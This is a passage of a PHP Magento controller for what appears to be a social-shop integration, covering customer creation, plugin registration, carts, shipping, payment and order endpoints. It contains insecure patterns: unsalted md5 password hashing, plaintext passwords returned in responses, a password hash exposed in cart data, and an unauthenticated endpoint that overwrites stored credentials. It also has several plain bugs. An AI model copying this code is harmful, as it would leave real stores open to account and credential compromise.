            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function loginCostumerCreate($request) {

        $model = new FBShop_Platform_Model_Platform();
        $shopName = $request->getParam('shopName');
        $firstname = $request->getParam('firstname');
        $lastname = $request->getParam('lastname');
        $email = $request->getParam('email');

        $n = rand(5, 8);
        $str = "";
        $characters = array_merge(range('A', 'Z'), range('a', 'z'), range('0', '9'));
        $max = count($characters) - 1;
        for ($i = 0; $i < $n; $i++) {
            $rand = mt_rand(0, $max);
            $str .= $characters[$rand];
        }

        $password = $str;


// Website and Store details
        $websiteId = Mage::app()->getWebsite()->getId();
        $store = Mage::app()->getStore();

        $customer = Mage::getModel("customer/customer");
        $customer->website_id = $websiteId;
        $customer->setStore($store);


        try {
            // If new, save customer information
            $customer->firstname = $firstname;
            $customer->lastname = $lastname;
            $customer->email = $email;
            $customer->password_hash = md5($password);

            $q = $customer->save();

            if ($q) {
                if (isset($shopName)) {
                    Mage::getSingleton('customer/session')->setCustomerAsLoggedIn($customer);
                } else {
                    $result = array(
                        "entity_id" => $customer->getId(),
                        "firstName" => $customer->getFirstname(),
                        "lastName" => $customer->getLastname(),
                        "email" => $customer->getEmail(),
                        "password" => $password
                    );

                    return $result;
                }
            } else {
//                echo "An error occured while saving customer";
            }
       

        $customer = Mage::getModel('customer/customer')
                ->setWebsiteId(Mage::app()->getStore()->getWebsiteId())
                ->loadByEmail($email);
        if (isset($shopName)) {
            Mage::getSingleton('customer/session')->setCustomerAsLoggedIn($customer);
        } else {
            $result = array(
                "entity_id" => $customer->getId(),
                "firstName" => $firstname,
                "lastName" => $lastname,
                "email" => $email,
                "password" => "",
            );

            
            return $result;
        }
         } catch (Exception $e) {
            
        }
    }

    public function orderInfoAction() {

        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");


        try {
            $this->loginUser();
            $id = $this->getRequest()->getParam('id');

            $customerEmail = $this->getRequest()->getParam('customerEmail');
            if (isset($id) && isset($customerEmail)) {
                $order = Mage::getModel('sales/order')->load($id);

                // return $order->getCustomerEmail();

                if ($order->getCustomerEmail() == $customerEmail) {
                    $json = array('id' => $order->getId(),
                        'incrementId' => $order->getIncrementId(),
                        'status' => $order->getStatus());
                    $jsonn = json_encode($json);
                    echo $jsonn;
                }
            }else
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function mediaGallery($product) {
        $media = $product->getMediaGallery();
        $host = Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB);
        $host .="media/catalog/product";
//            echo "<pre>";
//                print_r($media);
//             echo "</pre>";
//                
        foreach ($media['images'] as $img)
            $json[] = array("url" => $host . $img['file'],
                "position" => $img['position'],
                "exclude" => ($img['disabled'] == 1) ? "true" : "false",
                "label" => $img['label']);
        // var_dump($json);
        //    $jsonn = json_encode($json);
        return $json;
    }

    public function pluginDoneAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            //    $this->loginUser();

            $host = $this->getRequest()->getParam('request');
            $shopName = $this->getRequest()->getParam('shopName');
            $userName = $this->getRequest()->getParam('userName');
            $passwordName = $this->getRequest()->getParam('passwordName');
            // $userApi = $this->getRequest()->getParam('userApi');

            if (isset($host) && isset($shopName) && isset($userName) && isset($passwordName)) {

                $models = Mage::getResourceModel('platform/platform_collection')->getAllIds();
                if (is_array($models)) {
                    foreach ($models as $key => $modelId) {
                        try {
                            $model = Mage::getSingleton('platform/platform')->load($modelId);
                            $model->delete();
                        } catch (Exception $e) {
                            echo "<br/>Can't delete meta plugin w/ id: $productId";
                        }
                    }
                }
                $model = Mage::getModel('platform/platform');
                $model->setVersion($model->version);
                $model->setHost($model->host);
                $model->setShop($shopName);
                $model->setUser($userName);
                $model->setPassword($passwordName);
                $model->setStatus(1);
                try {
                    if ($model->getCreatedTime() == NULL || $model->getUpdateTime() == NULL) {
                        $model->setCreatedTime(now())
                                ->setUpdateTime(now());
                    } else {
                        $model->setUpdateTime(now());
                    }

                    $model->save();
                } catch (Exception $e) {
                    $this->toJsonErr($e->getCode(), $e->getMessage());
                    return;
                }
            } else
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function getProductCategory($product) {
        $json = array();
        if ($product->getId()) {
            $categoryIds = $product->getCategoryIds();
            foreach ($categoryIds as $id) {
                $json [] = (int) $id;
            }
        }
        return $json;
    }

    public function isProductAction() {

        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");


        try {
            $this->loginUser();
            $id = $this->getRequest()->getParam('productId');
            if (!isset($id)) {
                throw new Exception("Product ID is required.", $this->INVALID_PARAMS_ERROR);
            }
            $product = Mage::getModel('catalog/product')->load($id);
            if ($product->getId() == $id)
                $json = array('exists' => 'true');
            else
                $json = array('exists' => 'false');
            echo json_encode($json);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function addNotificationAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $this->loginUser();
            $title = $this->getRequest()->getParam('title');
            $description = $this->getRequest()->getParam('description');
            $severity = $this->getRequest()->getParam('severity');
            $url = $this->getRequest()->getParam('url');
            if (empty($title) || empty($description) || empty($severity) || empty($url))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);

            $model = Mage::getModel('adminnotification/inbox');
            $model->setTitle($title);
            $model->setDescription($description);
            $model->setSeverity($severity);
            $model->setUrl($url);
            $id = $model->save();
            $json = array("status" => (isset($id)) ? "true" : "false");
            echo json_encode($json);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    protected function _getStoreId($store = null) {
        if (is_null($store)) {
            $store = ($this->_getSession()->hasData($this->_storeIdSessionField) ? $this->_getSession()->getData($this->_storeIdSessionField) : 0);
        }

        try {
            $storeId = Mage::app()->getStore($store)->getId();
        } catch (Mage_Core_Model_Store_Exception $e) {
            $this->_fault('store_not_exists');
        }

        return $storeId;
    }

    /**
     * Retrieves quote by quote identifier and store code or by quote identifier
     *
     * @param int $quoteId
     * @param string|int $store
     * @return Mage_Sales_Model_Quote
     */
    protected function _getQuote($quoteId, $store = null) {
        /** @var $quote Mage_Sales_Model_Quote */
        $quote = Mage::getModel("sales/quote");

        if (!(is_string($store) && is_integer($store))) {
            $quote->loadByIdWithoutStore($quoteId);
        } else {
            $storeId = $this->_getStoreId($store);

            $quote->setStoreId($storeId)
                    ->load($quoteId);
        }
        if (is_null($quote->getId())) {
            $this->_fault('quote_not_exists');
        }

        return $quote;
    }

    protected function _getStoreIdFromQuote($quoteId) {
        $quote = Mage::getModel('sales/quote')
                ->loadByIdWithoutStore($quoteId);

        return $quote->getStoreId();
    }

    protected function _preparePaymentData($data) {
        if (!(is_array($data) && is_null($data[0]))) {
            return array();
        }

        return $data;
    }

    protected function _canUsePaymentMethod($method, $quote) {
//        if ( !($method->isGateway() || $method->canUseInternal()) ) {
//            return false;
//        }

        if (!$method->canUseForCountry($quote->getBillingAddress()->getCountry())) {
            return false;
        }

        if (!$method->canUseForCurrency(Mage::app()->getStore($quote->getStoreId())->getBaseCurrencyCode())) {
            return false;
        }

        /**
         * Checking for min/max order total for assigned payment method
         */
        $total = $quote->getBaseGrandTotal();
        $minTotal = $method->getConfigData('min_order_total');
        $maxTotal = $method->getConfigData('max_order_total');

        if ((!empty($minTotal) && ($total < $minTotal)) || (!empty($maxTotal) && ($total > $maxTotal))) {
            return false;
        }

        return true;
    }

    protected function _getPaymentMethodAvailableCcTypes($method) {
        $ccTypes = Mage::getSingleton('payment/config')->getCcTypes();
        $methodCcTypes = explode(',', $method->getConfigData('cctypes'));
        foreach ($ccTypes as $code => $title) {
            if (!in_array($code, $methodCcTypes)) {
                unset($ccTypes[$code]);
            }
        }
        if (empty($ccTypes)) {
            return null;
        }

        return $ccTypes;
    }

    /**
     * @param  $quoteId
     * @param  $store
     * @return array
     * 
     */
    public function getPaymentMethodsList
            ($quoteId, $store = null) {
        $quote = $this->_getQuote($quoteId, $store);
        $store = $quote->getStoreId();

        $total = $quote->getBaseSubtotal();

        $methodsResult = array();
        $methods = Mage::helper('payment')->getStoreMethods($store, $quote);
        foreach ($methods as $key => $method) {
            /** @var $method Mage_Payment_Model_Method_Abstract */
            if ($this->_canUsePaymentMethod($method, $quote)
                    && ($total != 0
                    || $method->getCode() == 'free'
                    || ($quote->hasRecurringItems() && $method->canManageRecurringProfiles()))) {
                $methodsResult[] =
                        array(
                            "code" => $method->getCode(),
                            "title" => $method->getTitle(),
                            "ccTypes" => $this->_getPaymentMethodAvailableCcTypes($method)
                );
            }
        }

        return $methodsResult;
    }

    /**
     * @param  $quoteId
     * @param  $paymentData
     * @param  $store
     * @return bool
     */
    public function setPaymentMethod($paymentData, $store = null) {
        $cartId = $this->getRequest()->getParam('cartId');
        $quote = Mage::getModel("sales/quote")->loadByIdWithoutStore($cartId);
        $store = $quote->getStoreId();

        $paymentData = $this->_preparePaymentData($paymentData);
        if (empty($paymentData)) {
            return false;
        }

        if ($quote->isVirtual()) {
            // check if billing address is set
            if (is_null($quote->getBillingAddress()->getId()) ) {
                return false;
            }
            $quote->getBillingAddress()->setPaymentMethod(isset($paymentData['method']) ? $paymentData['method'] : null);
        } else {
            // check if shipping address is set
            if (is_null($quote->getShippingAddress()->getId()) ) {
                  return false;
            }
            $quote->getShippingAddress()->setPaymentMethod(isset($paymentData['method']) ? $paymentData['method'] : null);
        }

        if (!$quote->isVirtual() && $quote->getShippingAddress()) {
            $quote->getShippingAddress()->setCollectShippingRates(true);
        }

        $total = $quote->getBaseSubtotal();
        $methods = Mage::helper('payment')->getStoreMethods($store, $quote);
        foreach ($methods as $key=>$method) {
            if ($method->getCode() == $paymentData['method']) {
                /** @var $method Mage_Payment_Model_Method_Abstract */
                if (!($this->_canUsePaymentMethod($method, $quote)
                        && ($total != 0
                            || $method->getCode() == 'free'
                            || ($quote->hasRecurringItems() && $method->canManageRecurringProfiles())))) {
                       return false;
                }
            }
        }

        try {
            $payment = $quote->getPayment();
            $payment->importData($paymentData);


            $quote->setTotalsCollectedFlag(false)
                    ->collectTotals()
                    ->save();
        } catch (Mage_Core_Exception $e) {
            return false;
        }
        return true;
    }

    //++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ACTIONS++++++++++++++++++++++++++++++++++++++++++++++++++
    public function cartCreateAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $this->loginUser();
            $activeSalesRules = Mage::getModel('salesrule/rule')
                    ->getCollection()
                    ->addFieldToSelect('rule_id')
                    ->addFieldToFilter('is_active', 1)
                    ->getData();
            $cart = Mage::getSingleton('checkout/cart');

            $cart->save();


//      Mage::getSingleton('checkout/session')->setCartWasUpdated(true);
            $quote = $cart->getQuote();
            $id = $quote->getId();

            $shippingAddress = $quote->getShippingAddress();
            $ccId = $shippingAddress->getCountryId();

            if (empty($ccId)) {
                // var_dump($ccId);
                $countryId = Mage::getStoreConfig('general/country/default');
                $quote->getShippingAddress()
                        ->setCollectShippingRates(true)
                        ->setCountryId($countryId)->save();
            }


            $agreementsData = array();
            if (Mage::getStoreConfigFlag('checkout/options/enable_agreements')) {
                 $agreements = Mage::getModel('checkout/agreement')->getCollection()
                        ->addStoreFilter(Mage::app()->getStore()->getId())
                        ->addFieldToFilter('is_active', 1);
                 $agreementsData = $agreements->getData();
                
            }


            $json = array("cartId" => $id,
                "activeSalesRules" => (boolean) !empty($activeSalesRules),
                "agreements" => $agreementsData);



            echo json_encode($json);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function cartUpdateAction() {

        try {
            $cartId = $this->getRequest()->getParam('cartId');
             $this->loginUser();
            $p = $this->cartSetAddress();
            $q = $this->saveShippingMeth();
            $o = $this->setPayment();
            $this->setGiftMessage();
       } catch (Exception $e) {
            $q = false;
        }
        $json["status"] = ( $q) ? "true" : "false";
        echo json_encode($json);
    }

    public function setGiftMessage() {

        $quote = Mage::getSingleton("checkout/cart")->getQuote();
        $giftMessage = $this->getRequest()->getParam("giftmessage");
        if (empty($giftMessage)) {
//            $this->_fault('giftmessage_invalid_data');
            return;
        }
//
//        $giftMessage['type'] = 'quote';
//      //  $giftMessages = array($quoteId => $giftMessage);
        $request = new Mage_Core_Controller_Request_Http();
        $request->setParam("giftmessage", $giftMessages);

        return $this->_setMessage($quote->getId(), $request, $quote);
    }

    protected function _setMessage($entityId, $request, $quote) {

        try {
            Mage::dispatchEvent(
                    'checkout_controller_onepage_save_shipping_method', array('request' => $request, 'quote' => $quote)
            );
            return array('entityId' => $entityId, 'result' => true, 'error' => '');
        } catch (Exception $e) {
            return array('entityId' => $entityId, 'result' => false, 'error' => $e->getMessage());
        }
    }

    public function setPayment() {
        try {
            $data = $this->getRequest()->getParam('payment', array());
            $cartId=$this->getRequest()->getParam("cartId");
            //  print_r($data);
            if (empty($data))
                return false;
//            print_r($data);
//            $model= Mage::getModel("checkout/cart_payment_api");
//            return $model->setPaymentMethod($cartId,$data);
            $this->setPaymentMethod($data);
        } catch (Mage_Payment_Exception $e) {
            return false;
        }
        return true;
    }

    public function saveShippingMeth() {
        try {
            $cartId = $this->getRequest()->getParam('cartId');
            $quote = Mage::getModel("sales/quote")->loadByIdWithoutStore($cartId);
            $shippingMethod = $this->getRequest()->getParam('shipping_method');
            if (empty($shippingMethod)) {
                return false;
            }
            $rate = $quote->getShippingAddress()->getShippingRateByCode($shippingMethod);
            if (!$rate) {
                return false;
            }
            try {
                $quote->getShippingAddress()->setShippingMethod($shippingMethod);
                $quote->collectTotals()->save();
            } catch (Mage_Core_Exception $e) {
                return false;
            }
        } catch (Exception $e) {
            
        }
    }

    public function cartSetAddress() {
        try {
            $cartId = $this->getRequest()->getParam('cartId');
            $billing = $this->getRequest()->getParam('billing');
            
            if (empty($billing))
                return false;
            $shipping = $this->getRequest()->getParam('shipping');
            $newBillingAddress = Mage::getModel('sales/quote_address');
            $newShippingAddress = Mage::getModel('sales/quote_address');
            $newBillingAddress->setData($billing);
            $newBillingAddress->implodeStreetAddress();

            if ($billing["use_for_shipping"] == "true")
                $shipping=$billing;
             
           $newShippingAddress->setData($shipping);
           $newShippingAddress->implodeStreetAddress();
           
                $customerData = $billing;
                $customerData["firstname"] = ($billing["firstname"])? $billing["firstname"]:"tepmFirstName";
                $customerData["lastname"] = ($billing["lastname"])? $billing["lastname"]: "tempLastName";
                $customerData["email"] = ($billing["email"])? $billing["email"] : "tempMail@test.com"; 
      
            $customerData['mode']=Mage_Checkout_Model_Type_Onepage::METHOD_GUEST;
            $customerData["website_id"] = "0";
	    $customerData["store_id"] = "0";
            $model= Mage::getModel('checkout/cart_customer_api');
            $q=$model->set($cartId,$customerData);
            
            $quote = Mage::getModel("sales/quote")->loadByIdWithoutStore($cartId);
            $quote->setBillingAddress($newBillingAddress);
            $quote->setShippingAddress($newShippingAddress);
            $quote->collectTotals();
            $quote->save();
          
//            $this->loadCartAction($quote->getId());
            return true;
        } catch (Exception $e) {
//            echo $e->getMessage();
            return false;
        }
    }

    
    public function cartPaymentMethodList($id) {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $this->loginUser();
            if (!isset($id))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
            $paymentMethods = $this->getPaymentMethodsList($id);

            $json = array();
            foreach ($paymentMethods as $paymentMethod) {
                $cctype = array();
                if ($paymentMethod["ccTypes"])
                    foreach ($paymentMethod["ccTypes"] as $code => $value) {
                        $cctype[] = array("code" => $code,
                            "title" => $value);
                    }
                $json[] = array("code" => $paymentMethod["code"],
                    "title" => $paymentMethod["title"],
                    "ccTypes" => $cctype
                );
            }
//             echo "<pre>";
//    print_r($paymentMethods);
//    echo "</pre>";
//            echo json_encode($json);
            return $json;
        } catch (Exception $e) {
            $this->getResponse()->setHttpResponseCode(400);
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }


    public function cartShippingMethodList($id) {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            if (!isset($id))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
            $model = Mage::getModel("checkout/cart_shipping_api");
            $shippingMethods = $model->getShippingMethodsList($id);
            $json = array();
            foreach ($shippingMethods as $method) {
                $json[] = array
                    ("carrier" => $method["carrier"],
                    "carrierTitle" => $method["carrier_title"],
                    "code" => $method["code"],
                    "method" => $method["method"],
                    "methodDescription" => $method["method_description"],
                    "price" => $method["price"],
                    "methodTitle" => $method["method_title"],
                    "errorMessage" => $method["error_message"],
                    "carrierName" => $method["carrierName"]
                );
            }

//             echo "<pre>";
//    print_r($shippingMethods);
//    echo "</pre>";
//            echo json_encode($json);
            return $json;
        } catch (Exception $e) {
            $this->getResponse()->setHttpResponseCode(400);
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

       public function cartOrderAction() {
            $id = $this->getRequest()->getParam('cartId');
            if (!isset($id))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
            $model = Mage::getModel("checkout/cart_api");
            $licenseAgreement = $model->licenseAgreement($id);
            $licenseForOrderCreation = null;
            if (count($licenseAgreement)) {
                $licenseForOrderCreation = array();
                foreach ($licenseAgreement as $license) {
                    $licenseForOrderCreation[] = $license['agreement_id'];
                }
            }

            $orderId = $model->createOrder($id, null, $licenseForOrderCreation);
            return $orderId;
        
    }

    public function redirectPlaceOrderAction() {
        try {
            $cartId = $this->getRequest()->getParam('cartId');
            $returnUrl = $this->getRequest()->getParam('returnUrl');
            if (!isset($cartId) || !isset($returnUrl))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
            $model = Mage::getModel("checkout/cart_api");
            $q = $model->info($cartId);
            $method = Mage::helper('payment')->getMethodInstance($q["payment"]["method"]);
            Mage::getSingleton('core/session')->setReturnUrl($returnUrl);
            $redirectUrl = "";
            $redirectAfterPlaceOrderUrl = "";
            if ($method) {
                $redirectUrl = $method->getOrderPlaceRedirectUrl();
                $redirectAfterPlaceOrderUrl = $method->getCheckoutRedirectUrl();
            }
            if ($redirectAfterPlaceOrderUrl) {
                $this->loadCartAction($cartId);
               
                Mage::app()->getResponse()->setRedirect($redirectAfterPlaceOrderUrl);
            } else {
                     $quote = Mage::getModel("sales/quote")->loadByIdWithoutStore($cartId);
                      $reservedOrderId=$quote->getReservedOrderId();
                    if (empty($reservedOrderId)) {
                        $ordId= $this->cartOrderAction();
                        $this->loadCartAction($cartId);
                        
                        $quote = Mage::getModel("sales/quote")->loadByIdWithoutStore($cartId);
                        $order = Mage::getModel("sales/order")->loadByIncrementId($quote->getReservedOrderId());
                        
                        Mage::getSingleton('checkout/session')->setLastRealOrderId($order->getIncrementId());
                        Mage::getSingleton('checkout/session')->setLastSuccessQuoteId($cartId);
                        Mage::getSingleton('checkout/session')->setLastOrderId($order->getId());
                        $result['success'] = true;
                        $result['error'] = false;
                    }
           

                if (isset($redirectUrl)) {
                    $this->loadCartAction($cartId);
                    Mage::app()->getResponse()->setRedirect($redirectUrl);
                } else if ($result['success'])
                    $this->_redirect("checkout/onepage/success");
            }
        } catch (Exception $e) {
                         $this->loadCartAction($cartId);
                         $this->_redirect("checkout/cart");
                         Mage::app()->getResponse()->setRedirect(Mage::getUrl('checkout/cart'));
                         header("Location: ".Mage::getUrl('checkout/cart'));
        }
    }

//    public function cartTotalsAction() {
//        header("Content-Type: application/json");
//        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
//
//        try {
//            $this->loginUser();
//            $id = $this->getRequest()->getParam('cartId');
//            if (!isset($id) && !isset($products))
//                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
//
//            $model = Mage::getModel("checkout/cart_api");
//            $q = $model->totals($id);
//            echo json_encode($q);
//        } catch (Exception $e) {
//            $this->toJsonErr($e->getCode(), $e->getMessage());
//        }
//    }

    public function cartInfoAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $this->loginUser();
            $id = $this->getRequest()->getParam('cartId');
            if (!isset($id) && !isset($products))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);

            $model = Mage::getModel("checkout/cart_api");
            $q = $model->info($id);

            $activeSalesRules = Mage::getModel('salesrule/rule')
                    ->getCollection()
                    ->addFieldToSelect('rule_id')
                    ->addFieldToFilter('is_active', 1)
                    ->getData();

            foreach ($q["items"] as $item) {
                $items[] = array
                    ("itemId" => $item["item_id"],
                    "cartId" => $item["quote_id"],
                    "createdAt" => $item["created_at"],
                    "updatedAt" => $item["updated_at"],
                    "productId" => $item["product_id"],
                    "storeId" => $item["store_id"],
                    "parentItemId" => $item["parent_item_id"],
                    "isVirtual" => $item["is_virtual"],
                    "sku" => $item["sku"],
                    "name" => $item["name"],
                    "description" => $item["description"],
                    "appliedRuleIds" => $item["applied_rule_ids"],
                    "additionalData" => $item["additional_data"],
                    "freeShipping" => $item["free_shipping"],
                    "isQtyDecimal" => $item["is_qty_decimal"],
                    "noDiscount" => $item["no_discount"],
                    "weight" => $item["weight"],
                    "qty" => $item["qty"],
                    "price" => $item["price"],
                    "basePrice" => $item["base_price"],
                    "customPrice" => $item["custom_price"],
                    "discountPercent" => $item["discount_percent"],
                    "discountDmount" => $item["discount_amount"],
                    "baseDiscountDmount" => $item["base_discount_amount"],
                    "taxPercent" => $item["tax_percent"],
                    "taxAmount" => $item["tax_amount"],
                    "baseTaxAmount" => $item["base_tax_amount"],
                    "rowTotal" => $item["row_total"],
                    "baseRowTotal" => $item["base_row_total"],
                    "rowTotalWithDiscount" => $item["row_total_with_discount"],
                    "rowWeight" => $item["row_weight"],
                    "productType" => $item["product_type"],
                    "baseTaxBeforeDiscount" => $item["base_tax_before_discount"],
                    "taxBeforeDiscount" => $item["tax_before_discount"],
                    "originalCustomPrice" => $item["original_custom_price"],
                    "giftMessage_id" => $item["gift_message_id"],
                    'weeeTaxApplied' => $item["weee_tax_applied"],
                    'weeeTaxAppliedAmount' => $item["weee_tax_applied_amount"],
                    'weeeTaxAppliedRowAmount' => $item["weee_tax_applied_row_amount"],
                    'baseWeeeTaxAppliedAmount' => $item["base_weee_tax_applied_amount"],
                    'baseWeeeTaxAppliedRowAmnt' => $item["base_weee_tax_applied_row_amnt"],
                    'weeeTax_disposition' => $item["weee_tax_disposition"],
                    'weeeTaxRowDisposition' => $item["weee_tax_row_disposition"],
                    "baseWeeeTaxDisposition" => $item["base_weee_tax_disposition"],
                    "baseWeeeTaxRowDisposition" => $item["base_weee_tax_row_disposition"],
                    "redirectUrl" => $item["redirect_url"],
                    "baseCost" => $item["base_cost"],
                    "priceInclTax" => $item["price_incl_tax"],
                    "basePriceInclTax" => $item["base_price_incl_tax"],
                    "rowTotalInclTax" => $item["row_total_incl_tax"],
                    "baseRowTotalInclTax" => $item["base_row_total_incl_tax"],
                    "hiddenTaxAmount" => $item["hidden_tax_amount"],
                    "baseHiddenTaxAmount" => $item["base_hidden_tax_amount"],
                    "qtyOptions" => $item["qty_options"],
                    "taxClassId" => $item ["tax_class_id"],
                    "isRecurring" => $item["is_recurring"],
                    "hasError" => $item ["has_error"]
                );
            }


            $method = Mage::helper('payment')->getMethodInstance($q["payment"]["method"]);
            $redirectUrl = "";
            $redirectAfterPlaceOrderUrl = "";
            if ($method) {
                $redirectUrl = $method->getOrderPlaceRedirectUrl();
                $redirectAfterPlaceOrderUrl = $method->getCheckoutRedirectUrl();
            }


//            $redirectAfterPlaceOrderUrl="";
//              $quote = Mage::getModel("sales/quote")->load($id);
//              $payment
//           $redirectAfterPlaceOrderUrl = $quote->getPayment()->getCheckoutRedirectUrl();

            $paymentMethods = $this->cartPaymentMethodList($id);
            $shippingMethods = $this->cartShippingMethodList($id);
            $agreementsData = null;
            if (Mage::getStoreConfigFlag('checkout/options/enable_agreements')) {
                   $agreements = Mage::getModel('checkout/agreement')->getCollection()
                        ->addStoreFilter(Mage::app()->getStore()->getId())
                        ->addFieldToFilter('is_active', 1);
                  $agreementsData= $agreements->getData();
            }
          
            $customerAddressOption = Mage::getStoreConfig('customer/address');
               $customerAddressOption = array(
                'street_lines' => $customerAddressOption['street_lines'],
                'prefix_show' => $customerAddressOption['prefix_show'],
                'prefix_options' => $customerAddressOption['prefix_options'],
                'middlename_show' => $customerAddressOption['middlename_show'],
                'suffix_show' => $customerAddressOption['suffix_show'],
                'suffix_options' => $customerAddressOption['suffix_options'],
                'dob_show' => $customerAddressOption['dob_show'],
                'gender_show' => $customerAddressOption['gender_show'],
                'taxvat_show' => $customerAddressOption['taxvat_show']);  
              foreach ($customerAddressOption as $key => $value){
                  if(empty($value))$customerAddressOption[$key]="";
              }
            $allowCountres = Mage::getStoreConfig('general/country/allow');
            if (strlen($allowCountres) > 0)
                $allowCountres = explode(",", $allowCountres);

            else
                $allowCountres=array();
            
            $tax=array();
            $quote = Mage::getModel("sales/quote")->loadByIdWithoutStore($id);
            $tax=$quote->getShippingAddress()->getAppliedTaxes();            
            if (empty($tax))$tax=array();
            
            $json = array
                (
                "agreements" => $agreementsData,
                "shippingMethods" => $shippingMethods,
                "paymentMethods" => $paymentMethods,
                "storeId" => $q["store_id"],
                "createdAt" => $q["created_at"],
                "updatedAt" => $q['updated_at'],
                "convertedAt" => $q['converted_at'],
                'isActive' => $q['is_active'],
                'isVirtual' => $q['is_virtual'],
                'isMultiShipping' => $q['is_multi_shipping'],
                'itemsCount' => $q['items_count'],
                'itemsQty' => $q['items_qty'],
                'origOrderId' => $q['orig_order_id'],
                'storeToBaseRate' => $q['store_to_base_rate'],
                'storeToQuoteRate' => $q['store_to_quote_rate'],
                'baseToGlobalRate' => $q['base_to_global_rate'],
                'baseToQuoteRate' => $q['base_to_quote_rate'],
                'globalCurrencyCode' => $q['global_currency_code'],
                'baseCurrencyCode' => $q['base_currency_code'],
                'storeCurrencyCode' => $q['store_currency_code'],
                'quoteCurrencyCode' => $q['quote_currency_code'],
                'grandTotal' => $q['grand_total'],
                'baseGrandTotal' => $q['base_grand_total'],
                'checkoutMethod' => $q['checkout_method'],
                'customerId' => $q['customer_id'],
                'customerTaxClassId' => $q['customer_tax_class_id'],
                'customerGroupId' => $q['customer_group_id'],
                'customerEmail' => $q['customer_email'],
                'customerPrefix' => $q['customer_prefix'],
                'customerFirstname' => $q['customer_firstname'],
                'customerMiddlename' => $q['customer_middlename'],
                'customerLastname' => $q['customer_lastname'],
                'customerSuffix' => $q['customer_suffix'],
                'customerDob' => $q['customer_dob'],
                'customerNote' => $q['customer_note'],
                'customerNoteNotify' => $q['customer_note_notify'],
                'customerIsGuest' => $q['customer_is_guest'],
                'customerTaxvat' => $q['customer_taxvat'],
                'remoteIp' => $q['remote_ip'],
                'appliedRuleIds' => $q['applied_rule_ids'],
                'reservedOrderId' => $q['reserved_order_id'],
                'passwordHash' => $q['password_hash'],
                'couponCode' => $q['coupon_code'],
                'subtotal' => $q['subtotal'],
                'baseSubtotal' => $q['base_subtotal'],
                'subtotalWithDiscount' => $q['subtotal_with_discount'],
                'baseSubtotalWithDiscount' => $q['base_subtotal_with_discount'],
                'giftMessageId' => $q['gift_message_id'],
                'isChanged' => $q['is_changed'],
                'triggerRecollect' => $q ['trigger_recollect'],
                'extShippingInfo' => $q['ext_shipping_info'],
                'customerGender' => $q['customer_gender'],
                'isPersistent' => $q['is_persistent'],
                'cartId' => $q['quote_id'],
                "activeSalesRules" => (boolean) !empty($activeSalesRules),
                "redirectUrl" => $redirectUrl,
                "redirectAfterPlaceOrderUrl" => $redirectAfterPlaceOrderUrl,
                'shippingAddress' => array
                    (
                    'addressId' => $q["shipping_address"]['address_id'],
                    'cartId' => $q["shipping_address"]['quote_id'],
                    'createdAt' => $q["shipping_address"]['created_at'],
                    'updatedAt' => $q["shipping_address"]['updated_at'],
                    'customerId' => $q["shipping_address"]['customer_id'],
                    'saveInAddressBook' => $q["shipping_address"]['save_in_address_book'],
                    'customerAddressId' => $q["shipping_address"]['customer_address_id'],
                    'addressType' => $q["shipping_address"]['address_type'],
                    'email' => $q["shipping_address"]['email'],
                    'prefix' => $q["shipping_address"]['prefix'],
                    'firstName' => $q["shipping_address"]['firstname'],
                    'middleName' => $q["shipping_address"]['middlename'],
                    'lastName' => $q["shipping_address"]['lastname'],
                    'suffix' => $q["shipping_address"]['suffix'],
                    'company' => $q["shipping_address"]['company'],
                    'street' => $q["shipping_address"]['street'],
                    'city' => $q["shipping_address"]['city'],
                    'region' => $q["shipping_address"]['region'],
                    'regionId' => $q["shipping_address"]['region_id'],
                    'postcode' => $q["shipping_address"]['postcode'],
                    'countryId' => $q["shipping_address"]['country_id'],
                    'telephone' => $q["shipping_address"]['telephone'],
                    'fax' => $q["shipping_address"]['fax'],
                    'sameAsBilling' => $q["shipping_address"]['same_as_billing'],
                    'freeShipping' => $q["shipping_address"]['free_shipping'],
